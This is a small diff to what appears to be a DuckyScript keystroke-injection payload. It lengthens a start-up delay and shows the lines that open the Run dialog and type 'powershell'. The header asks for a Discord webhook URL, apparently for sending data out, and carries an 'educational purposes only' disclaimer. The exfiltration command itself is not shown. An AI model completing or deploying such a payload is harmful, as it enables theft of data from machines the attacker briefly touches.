@@ -10,7 +10,7 @@ REM Mandatory Info: Add your Discord Webhook URL in quotes with no spaces and wi
 REM Discord URL:    Example: https://discord.com/api/webhooks/123456789012345678/adjlfjlejlidsjasdlijflie_ajsdflkjaljeiljkdajlkjd
 REM Legal:          This script is for educational purposes only please do not use this for malicious purposes
 
-DELAY 500
+DELAY 2000
 GUI r
 DELAY 200
 STRING powershell
